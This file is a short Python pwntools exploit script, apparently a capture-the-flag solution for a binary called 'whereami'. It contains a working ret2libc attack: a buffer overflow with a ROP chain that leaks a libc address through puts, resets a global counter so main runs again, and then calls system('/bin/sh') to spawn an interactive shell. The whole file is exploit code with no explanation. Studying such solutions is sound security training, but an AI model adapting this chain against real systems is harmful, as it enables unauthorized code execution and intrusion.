from pwn import *

#r = remote('challs.actf.co', 31222)
r = process("./whereami_patched")
e = ELF("./whereami_patched")
libc = ELF("./libc.so.6")
padding = b'A' * 72
pop_rdi = p64(0x401303)                 #address of "pop rdi; ret"
counter_variable = p64(0x40406c)        #address of a global variable called counter
ret_gadget = p64(0x40101a)              #address of "ret"
payload = padding + pop_rdi + p64(e.got.gets) + p64(e.plt.puts) + pop_rdi + counter_variable + p64(e.plt.gets) + ret_gadget + p64(e.sym.main)
r.sendline(payload)
r.recvuntil(b'Who are you? I hope you find yourself too.')
libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym.gets   
null_out_counter = p32(0x0)             #to null out the variable counter to run the main function again without getting terminated
r.sendline(null_out_counter)
payload = padding + pop_rdi + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + ret_gadget + p64(libc_base + libc.sym.system)
r.sendline(payload)
r.interactive()
